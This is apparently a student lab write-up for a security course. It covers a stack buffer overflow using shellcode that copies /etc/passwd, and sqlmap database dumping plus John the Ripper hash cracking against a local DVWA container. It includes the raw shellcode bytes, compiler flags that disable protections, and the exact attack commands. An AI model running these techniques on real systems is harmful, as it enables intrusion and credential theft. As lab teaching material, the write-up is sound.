# Lab #1,22110058, Luong Minh Nhat, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**:
## 1. Complie asm program and C program to execuatable

Complie asm program
``` 
    nasm -g -f elf shell.asm 
    ld -m elf_i386 -o shell shell.o
```

![](./imgs/task1_1.png)

Complie C program
``` 
    gcc -g vulnerable.c -o vulnerable.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
```
![](./imgs/task1_2.png)
## 2. Prepairing for attacking
Get shell code from complied asm program
```
    for i in $(objdump -d shell |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
```
![](./imgs/task1_3.png) 

<br>

The value that we got
```
\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80
```
78 bytes long

Use gdb to find redundant_code function address:
``` 
    gdb vulnerable -q
    disas redundant_code
```
![](./imgs/task1_4.png)

## 3. Stack frame
stack frame for main fucntion <br>
![](./imgs/task1_5.png)
## 4. Attack

**Conclusion**: in main fucntion use unsafe function `strcpy`, that lead to attack buffer overflow for attacker inject code, to prevent it, we can use safe function like `strncpy`

# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 


Set up
```
docker pull vulnerables/web-dvwa
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

Open your browser and navigate to http://localhost. You should see the DVWA login page. <br>
![](./imgs/task2_1.png)

Login with the default credentials: <br>

Username: admin <br>
Password: password <br>
![](./imgs/task2_2.png)

**Question 1**: Use sqlmap to get information about all available databases <br>
**Answer 1**:
```
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit" --dbs

```
![](./imgs/task2_3.png)
**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
get tables
```
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa --tables
```
![](./imgs/task2_4.png)
get users
```
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa --dump

```
![](./imgs/task2_5.png)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:
```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

```
